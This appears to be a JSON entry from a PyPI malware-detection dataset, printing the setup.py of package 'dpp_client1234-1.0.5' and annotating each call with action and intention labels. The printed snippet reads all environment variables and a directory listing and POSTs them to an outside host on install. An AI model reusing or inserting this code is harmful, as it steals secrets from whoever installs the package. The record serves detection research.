{
  "metadata": {
    "package_name": "dpp_client1234-1.0.5",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/dpp_client1234-1.0.5.txt",
    "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/dpp_client1234-1.0.5/dpp_client1234-1.0.5/setup.py",
    "code_hash": "5141bd0d0330a9bf63ca2a735a990d1e",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/dpp_client1234-1.0.5.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "hash_value": "5141bd0d0330a9bf63ca2a735a990d1e",
      "code_snippets": [
        {
          "snippet": "import urllib.request\nimport urllib.parse\nimport os\n\nstream = os.popen('env')\npwd = stream.read()\n\nparams = urllib.parse.urlencode({'pwd': pwd, 'files': os.listdir(\"./../\")}).encode()\n\nurllib.request.urlopen(\"http://pt.traktrain.com/req.php?test\", data=params);",
          "triple_sequences": [
            {
              "action_api": "os.popen()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "env",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "stream.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "./../",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "urllib.parse.urlencode()",
              "action_description": "Encodes mapping object to URL query string",
              "action_id": "encode_url_query",
              "object": "{'pwd': pwd, 'files': os.listdir(\"./../\")}",
              "object_description": "Query parameter",
              "object_id": "query_parameter",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "http://pt.traktrain.com/req.php?test",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}